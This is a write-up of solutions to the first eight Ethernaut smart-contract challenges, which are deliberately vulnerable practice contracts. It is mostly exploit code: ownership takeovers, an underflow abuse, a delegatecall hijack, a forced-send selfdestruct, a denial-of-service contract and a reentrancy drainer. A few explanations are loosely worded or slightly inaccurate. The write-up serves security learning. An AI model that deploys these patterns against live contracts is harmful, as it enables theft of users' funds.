# Solutions of OpenZeppelin's Ethernaut Challenges

## 1. Fallback

```
await contract.contribute({value: 1337 });
await contract.sendTransaction({value: 1337});
contract.withdraw();
```

## 2. Fallout

The problem here is that the contructor is misspelled.
Therefore, the function *Fal1out* can be called from another contract for claiming the target contract.

```
await contract.Fal1out({value: 1337});
contract.sendAllocation(await contract.owner());
```

## 3. Token

Here we are dealing with an integer overflow issue in the require statement of the transfer function. This statement is always true, because both data types are defined as uint:

```
 require(balances[msg.sender] - _value >= 0);
```

 Therefore, we are able to get (a lot of) tokens for free when sending tokens to an arbitrary address:

 ```
 await contract.balanceOf(web3.eth.defaultAccount); // 20
 await contract.transfer("0x7e260279a09fca029471185995c29dd7b293921f", 1337);
 await contract.balanceOf(web3.eth.defaultAccount); // much much more than 20 :)
```

## 4. Delegation

We are using the fallout function to delegate call to *pwn()*, which sets the msg.sender (attacker's wallet address) to owner.

 ```
 web3.sha3("pwn()");
 > "0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab"
 //effectively the first four bytes are: 0xdd365b8b

 await contract.sendTransaction({ data:"0xdd365b8b" });
```

## 5. Force

```
pragma solidity ^0.4.20;

contract Force {

 function Force() public payable {}

 function exploit(address _target) public {
    //_target address, which will receive Ethers
    selfdestruct(_target);
 }
}
```

## 6. King

The idea here is to create a contract with a reverting fallback function.

```
pragma solidity ^0.4.20;

contract King {

function King() public {}

function takeover(address _target) public payable {
//target King contract
_target.call.value(msg.value)();
}

function() public payable {
    revert();
}
```

## 7. Reentrancy

In memory of the good old DAO hack, we need to determine in which "recursion depth" we are (here variable *exploited* is used):

```
contract ExploitReentrancy {

  uint donated;
  Reentrance target;
  bool exploited = false;

  function ExploitReentrancy(address _target) public payable {
      target = Reentrance(_target);
      donated = msg.value;
      target.donate.value(msg.value)(address(this));
  }

  function exploit() public {
      target.withdraw(donated);
  }

  function() public payable {
    if (!exploited) {
        exploited = true;
        if (donated > target.balance) {
            target.withdraw(donated);
        } else {
            target.withdraw(target.balance);
        }
    }
  }

}
```

## 8. Elevator
The view modifier is not verified by the solidity compiler, therefore we can still change the state.

```
pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) view public returns (bool);
}

contract MalBuilding is Building {
  bool called = false;

  function isLastFloor(uint _floor) view public returns (bool) {
      //this contract works only once, but is sufficient for solving this excercise :)
      bool previous = called;
      called = true;
      return previous;
  }

  function exploit(address _target) public payable {
      Elevator elevator = Elevator(_target);
      elevator.goTo(1);
  }
}

contract Elevator {
  function goTo(uint _floor) public;
}
```
